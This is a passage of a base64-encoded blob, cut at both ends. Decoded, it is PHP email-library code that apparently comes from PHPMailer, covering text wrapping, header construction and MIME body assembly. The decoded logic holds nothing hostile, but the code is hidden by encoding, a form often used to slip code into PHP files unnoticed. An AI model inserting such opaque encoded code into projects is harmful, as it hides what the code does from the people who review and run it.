AsIC0kbGVsZW4pOw0KICAgICAgICB9DQogICAgICAgICRsaW5lcyAgID0gZXhwbG9kZSgkdGhpcy0+TEUsICRtZXNzYWdlKTsNCiAgICAgICAgJG1lc3NhZ2UgPSAnJzsNCiAgICAgICAgZm9yZWFjaCAoJGxpbmVzIGFzICRsaW5lKSB7DQogICAgICAgICAgICAkd29yZHMgICAgID0gZXhwbG9kZSgnICcsICRsaW5lKTsNCiAgICAgICAgICAgICRidWYgICAgICAgPSAnJzsNCiAgICAgICAgICAgICRmaXJzdHdvcmQgPSB0cnVlOw0KICAgICAgICAgICAgZm9yZWFjaCAoJHdvcmRzIGFzICR3b3JkKSB7DQogICAgICAgICAgICAgICAgaWYgKCRxcF9tb2RlIGFuZCAoc3RybGVuKCR3b3JkKSA+ICRsZW5ndGgpKSB7DQogICAgICAgICAgICAgICAgICAgICRzcGFjZV9sZWZ0ID0gJGxlbmd0aCAtIHN0cmxlbigkYnVmKSAtICRjcmxmbGVuOw0KICAgICAgICAgICAgICAgICAgICBpZiAoISRmaXJzdHdvcmQpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkc3BhY2VfbGVmdCA+IDIwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICRzcGFjZV9sZWZ0Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaXNfdXRmOCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJHRoaXMtPnV0ZjhDaGFyQm91bmRhcnkoJHdvcmQsICRsZW4pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAxLCAxKSA9PSAnPScpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbi0tOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAyLCAxKSA9PSAnPScpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiAtPSAyOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFydCA9IHN1YnN0cigkd29yZCwgMCwgJGxlbik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHdvcmQgPSBzdWJzdHIoJHdvcmQsICRsZW4pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRidWYgLj0gJyAnIC4gJHBhcnQ7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1ZiAuIHNwcmludGYoJz0lcycsIHNlbGY6OkNSTEYpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSAuPSAkYnVmIC4gJHNvZnRfYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAkYnVmID0gJyc7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKHN0cmxlbigkd29yZCkgPiAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGxlbmd0aCA8PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJGxlbmd0aDsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaXNfdXRmOCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gPSAkdGhpcy0+dXRmOENoYXJCb3VuZGFyeSgkd29yZCwgJGxlbik7DQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMSwgMSkgPT0gJz0nKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbi0tOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKHN1YnN0cigkd29yZCwgJGxlbiAtIDIsIDEpID09ICc9Jykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gLT0gMjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICRwYXJ0ID0gc3Vic3RyKCR3b3JkLCAwLCAkbGVuKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICR3b3JkID0gc3Vic3RyKCR3b3JkLCAkbGVuKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJHdvcmQpID4gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRwYXJ0IC4gc3ByaW50ZignPSVzJywgc2VsZjo6Q1JMRik7DQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAkcGFydDsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRidWZfbyA9ICRidWY7DQogICAgICAgICAgICAgICAgICAgIGlmICghJGZpcnN0d29yZCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAnICc7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAkd29yZDsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmxlbigkYnVmKSA+ICRsZW5ndGggYW5kICRidWZfbyAhPSAnJykgew0KICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1Zl9vIC4gJHNvZnRfYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICAkYnVmID0gJHdvcmQ7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGZpcnN0d29yZCA9IGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1ZiAuIHNlbGY6OkNSTEY7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRtZXNzYWdlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gdXRmOENoYXJCb3VuZGFyeSgkZW5jb2RlZFRleHQsICRtYXhMZW5ndGgpIHsNCiAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSBmYWxzZTsNCiAgICAgICAgJGxvb2tCYWNrICAgICAgPSAzOw0KICAgICAgICB3aGlsZSAoISRmb3VuZFNwbGl0UG9zKSB7DQogICAgICAgICAgICAkbGFzdENodW5rICAgICAgPSBzdWJzdHIoJGVuY29kZWRUZXh0LCAkbWF4TGVuZ3RoIC0gJGxvb2tCYWNrLCAkbG9va0JhY2spOw0KICAgICAgICAgICAgJGVuY29kZWRDaGFyUG9zID0gc3RycG9zKCRsYXN0Q2h1bmssICc9Jyk7DQogICAgICAgICAgICBpZiAoZmFsc2UgIT09ICRlbmNvZGVkQ2hhclBvcykgew0KICAgICAgICAgICAgICAgICRoZXggPSBzdWJzdHIoJGVuY29kZWRUZXh0LCAkbWF4TGVuZ3RoIC0gJGxvb2tCYWNrICsgJGVuY29kZWRDaGFyUG9zICsgMSwgMik7DQogICAgICAgICAgICAgICAgJGRlYyA9IGhleGRlYygkaGV4KTsNCiAgICAgICAgICAgICAgICBpZiAoJGRlYyA8IDEyOCkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoJGVuY29kZWRDaGFyUG9zID4gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJG1heExlbmd0aCA9ICRtYXhMZW5ndGggLSAoJGxvb2tCYWNrIC0gJGVuY29kZWRDaGFyUG9zKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAkZm91bmRTcGxpdFBvcyA9IHRydWU7DQogICAgICAgICAgICAgICAgfSBlbHNlaWYgKCRkZWMgPj0gMTkyKSB7DQogICAgICAgICAgICAgICAgICAgICRtYXhMZW5ndGggICAgID0gJG1heExlbmd0aCAtICgkbG9va0JhY2sgLSAkZW5jb2RlZENoYXJQb3MpOw0KICAgICAgICAgICAgICAgICAgICAkZm91bmRTcGxpdFBvcyA9IHRydWU7DQogICAgICAgICAgICAgICAgfSBlbHNlaWYgKCRkZWMgPCAxOTIpIHsNCiAgICAgICAgICAgICAgICAgICAgJGxvb2tCYWNrICs9IDM7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkZm91bmRTcGxpdFBvcyA9IHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRtYXhMZW5ndGg7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRXb3JkV3JhcCgpIHsNCiAgICAgICAgaWYgKCR0aGlzLT5Xb3JkV3JhcCA8IDEpIHsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICBzd2l0Y2ggKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsNCiAgICAgICAgICAgIGNhc2UgJ2FsdCc6DQogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lJzoNCiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOg0KICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZV9hdHRhY2gnOg0KICAgICAgICAgICAgICAgICR0aGlzLT5BbHRCb2R5ID0gJHRoaXMtPndyYXBUZXh0KCR0aGlzLT5BbHRCb2R5LCAkdGhpcy0+V29yZFdyYXApOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAkdGhpcy0+Qm9keSA9ICR0aGlzLT53cmFwVGV4dCgkdGhpcy0+Qm9keSwgJHRoaXMtPldvcmRXcmFwKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY3JlYXRlSGVhZGVyKCkgew0KICAgICAgICAkcmVzdWx0ID0gJyc7DQogICAgICAgIGlmICgkdGhpcy0+TWVzc2FnZURhdGUgPT0gJycpIHsNCiAgICAgICAgICAgICR0aGlzLT5NZXNzYWdlRGF0ZSA9IHNlbGY6OnJmY0RhdGUoKTsNCiAgICAgICAgfQ0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdEYXRlJywgJHRoaXMtPk1lc3NhZ2VEYXRlKTsNCiAgICAgICAgaWYgKCR0aGlzLT5TaW5nbGVUbykgew0KICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgIT0gJ21haWwnKSB7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0b2FkZHIpIHsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNpbmdsZVRvQXJyYXlbXSA9ICR0aGlzLT5hZGRyRm9ybWF0KCR0b2FkZHIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlmIChjb3VudCgkdGhpcy0+dG8pID4gMCkgew0KICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgew0KICAgICAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdUbycsICR0aGlzLT50byk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBlbHNlaWYgKGNvdW50KCR0aGlzLT5jYykgPT0gMCkgew0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ1RvJywgJ3VuZGlzY2xvc2VkLXJlY2lwaWVudHM6OycpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ0Zyb20nLCBhcnJheSgNCiAgICAgICAgICAgIGFycmF5KA0KICAgICAgICAgICAgICAgIHRyaW0oJHRoaXMtPkZyb20pLA0KICAgICAgICAgICAgICAgICR0aGlzLT5Gcm9tTmFtZQ0KICAgICAgICAgICAgKQ0KICAgICAgICApKTsNCiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5jYykgPiAwKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdDYycsICR0aGlzLT5jYyk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCgkdGhpcy0+TWFpbGVyID09ICdzZW5kbWFpbCcgb3IgJHRoaXMtPk1haWxlciA9PSAncW1haWwnIG9yICR0aGlzLT5NYWlsZXIgPT0gJ21haWwnKSBhbmQgY291bnQoJHRoaXMtPmJjYykgPiAwKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdCY2MnLCAkdGhpcy0+YmNjKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoY291bnQoJHRoaXMtPlJlcGx5VG8pID4gMCkgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnUmVwbHktVG8nLCAkdGhpcy0+UmVwbHlUbyk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgIT0gJ21haWwnKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdTdWJqZWN0JywgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCR0aGlzLT5TdWJqZWN0KSkpOw0KICAgICAgICB9DQogICAgICAgIGlmICgnJyAhPSAkdGhpcy0+TWVzc2FnZUlEIGFuZCBwcmVnX21hdGNoKCcvXjwuKkAuKj4kLycsICR0aGlzLT5NZXNzYWdlSUQpKSB7DQogICAgICAgICAgICAkdGhpcy0+bGFzdE1lc3NhZ2VJRCA9ICR0aGlzLT5NZXNzYWdlSUQ7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+bGFzdE1lc3NhZ2VJRCA9IHNwcmludGYoJzwlc0Alcz4nLCAkdGhpcy0+dW5pcXVlaWQsICR0aGlzLT5zZXJ2ZXJIb3N0bmFtZSgpKTsNCiAgICAgICAgfQ0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdNZXNzYWdlLUlEJywgJHRoaXMtPmxhc3RNZXNzYWdlSUQpOw0KICAgICAgICBpZiAoIWlzX251bGwoJHRoaXMtPlByaW9yaXR5KSkgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnWC1Qcmlvcml0eScsICR0aGlzLT5Qcmlvcml0eSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR0aGlzLT5Db25maXJtUmVhZGluZ1RvICE9ICcnKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdEaXNwb3NpdGlvbi1Ob3RpZmljYXRpb24tVG8nLCAnPCcgLiAkdGhpcy0+Q29uZmlybVJlYWRpbmdUbyAuICc+Jyk7DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPkN1c3RvbUhlYWRlciBhcyAkaGVhZGVyKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKHRyaW0oJGhlYWRlclswXSksICR0aGlzLT5lbmNvZGVIZWFkZXIodHJpbSgkaGVhZGVyWzFdKSkpOw0KICAgICAgICB9DQogICAgICAgIGlmICghJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ01JTUUtVmVyc2lvbicsICcxLjAnKTsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmdldE1haWxNSU1FKCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRyZXN1bHQ7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRNYWlsTUlNRSgpIHsNCiAgICAgICAgJHJlc3VsdCAgICAgID0gJyc7DQogICAgICAgICRpc211bHRpcGFydCA9IHRydWU7DQogICAgICAgIHN3aXRjaCAoJHRoaXMtPm1lc3NhZ2VfdHlwZSkgew0KICAgICAgICAgICAgY2FzZSAnaW5saW5lJzoNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L3JlbGF0ZWQ7Jyk7DQogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2F0dGFjaCc6DQogICAgICAgICAgICBjYXNlICdpbmxpbmVfYXR0YWNoJzoNCiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOg0KICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZV9hdHRhY2gnOg0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvbWl4ZWQ7Jyk7DQogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2FsdCc6DQogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lJzoNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L2FsdGVybmF0aXZlOycpOw0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsxXSAuICciJyk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCdDb250ZW50LVR5cGU6ICcgLiAkdGhpcy0+Q29udGVudFR5cGUgLiAnOyBjaGFyc2V0PScgLiAkdGhpcy0+Q2hhclNldCk7DQogICAgICAgICAgICAgICAgJGlzbXVsdGlwYXJ0ID0gZmFsc2U7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR0aGlzLT5FbmNvZGluZyAhPSAnN2JpdCcpIHsNCiAgICAgICAgICAgIGlmICgkaXNtdWx0aXBhcnQpIHsNCiAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPkVuY29kaW5nID09ICc4Yml0Jykgew0KICAgICAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nJywgJzhiaXQnKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCAkdGhpcy0+RW5jb2RpbmcpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+TEU7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRyZXN1bHQ7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRTZW50TUlNRU1lc3NhZ2UoKSB7DQogICAgICAgIHJldHVybiBydHJpbSgkdGhpcy0+TUlNRUhlYWRlciAuICR0aGlzLT5tYWlsSGVhZGVyLCAiXG5cciIpIC4gc2VsZjo6Q1JMRiAuIHNlbGY6OkNSTEYgLiAkdGhpcy0+TUlNRUJvZHk7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZW5lcmF0ZUlkKCkgew0KICAgICAgICByZXR1cm4gbWQ1KHVuaXFpZCh0aW1lKCkpKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNyZWF0ZUJvZHkoKSB7DQogICAgICAgICRib2R5ICAgICAgICAgICAgICA9ICcnOw0KICAgICAgICAkdGhpcy0+dW5pcXVlaWQgICAgPSAkdGhpcy0+Z2VuZXJhdGVJZCgpOw0KICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMV0gPSAnYjFfJyAuICR0aGlzLT51bmlxdWVpZDsNCiAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzJdID0gJ2IyXycgLiAkdGhpcy0+dW5pcXVlaWQ7DQogICAgICAgICR0aGlzLT5ib3VuZGFyeVszXSA9ICdiM18nIC4gJHRoaXMtPnVuaXF1ZWlkOw0KICAgICAgICBpZiAoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsNCiAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRNYWlsTUlNRSgpIC4gJHRoaXMtPkxFOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5zZXRXb3JkV3JhcCgpOw0KICAgICAgICAkYm9keUVuY29kaW5nID0gJHRoaXMtPkVuY29kaW5nOw0KICAgICAgICAkYm9keUNoYXJTZXQgID0gJHRoaXMtPkNoYXJTZXQ7DQogICAgICAgIGlmICgkYm9keUVuY29kaW5nID09ICc4Yml0JyBhbmQgISR0aGlzLT5oYXM4Yml0Q2hhcnMoJHRoaXMtPkJvZHkpKSB7DQogICAgICAgICAgICAkYm9keUVuY29kaW5nID0gJzdiaXQnOw0KICAgICAgICAgICAgJGJvZHlDaGFyU2V0ICA9ICd1cy1hc2NpaSc7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCdiYXNlNjQnICE9ICR0aGlzLT5FbmNvZGluZyBhbmQgc2VsZjo6aGFzTGluZUxvbmdlclRoYW5NYXgoJHRoaXMtPkJvZHkpKSB7DQogICAgICAgICAgICAkYm9keUVuY29kaW5nID0gJ3F1b3RlZC1wcmludGFibGUnOw0KICAgICAgICB9DQogICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAkdGhpcy0+RW5jb2Rpbmc7DQogICAgICAgICRhbHRCb2R5Q2hhclNldCAgPSAkdGhpcy0+Q2hhclNldDsNCiAgICAgICAgaWYgKCRhbHRCb2R5RW5jb2RpbmcgPT0gJzhiaXQnIGFuZCAhJHRoaXMtPmhhczhiaXRDaGFycygkdGhpcy0+QWx0Qm9keSkpIHsNCiAgICAgICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAnN2JpdCc7DQogICAgICAgICAgICAkYWx0Qm9keUNoYXJTZXQgID0gJ3VzLWFzY2lpJzsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJ2Jhc2U2NCcgIT0gJGFsdEJvZHlFbmNvZGluZyBhbmQgc2VsZjo6aGFzTGluZUxvbmdlclRoYW5NYXgoJHRoaXMtPkFsdEJvZHkpKSB7DQogICAgICAgICAgICAkYWx0Qm9keUVuY29kaW5nID0gJ3F1b3RlZC1wcmludGFibGUnOw0KICAgICAgICB9DQogICAgICAgICRtaW1lcHJlID0gIlRoaXMgaXMgYSBtdWx0aS1wYXJ0IG1lc3NhZ2UgaW4gTUlNRSBmb3JtYXQuIiAuICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgc3dpdGNoICgkdGhpcy0+bWVzc2FnZV90eXBlKSB7DQogICAgICAgICAgICBjYXNlICdpbmxpbmUnOg0KICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRib2R5Q2hhclNldCwgJycsICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnYXR0YWNoJzoNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYm9keUNoYXJTZXQsICcnLCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdpbmxpbmVfYXR0YWNoJzoNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvcmVsYXRlZDsnKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzJdIC4gJyInKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGJvZHlDaGFyU2V0LCAnJywgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2lubGluZScsICR0aGlzLT5ib3VuZGFyeVsyXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2F0dGFjaG1lbnQnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnYWx0JzoNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYWx0Qm9keUNoYXJTZXQsICd0ZXh0L3BsYWluJywgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5JY2FsKSkgew0KICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdL